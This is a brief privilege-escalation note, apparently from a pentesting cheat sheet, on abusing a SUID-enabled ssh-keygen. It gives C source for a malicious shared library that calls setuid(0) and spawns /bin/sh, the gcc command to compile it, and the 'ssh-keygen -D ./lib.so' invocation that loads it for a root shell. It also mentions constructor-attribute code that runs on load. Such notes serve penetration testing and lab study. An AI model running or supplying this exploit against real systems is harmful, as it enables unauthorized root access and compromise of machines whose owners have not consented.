# ssh-keygen
if ssh-keygen has suid bit set, we can load a custom library and get root access. ssh-keygen tries to "open" the \``` C_GetFunctionList` `` function which is our injection point. The code for the shared library is as follows:

```text-plain
int C_GetFunctionList(){
        setuid(0);
        system("/bin/sh");
}
int main() {}
```

compile the above C code into a shared library with : `gcc -shared -o lib.so lib.c` and run `ssh-keygen -D ./lib.so` to get root.

we can also inclue `__attribute__((constructor))` with a random function and it'll run whenever it's loaded.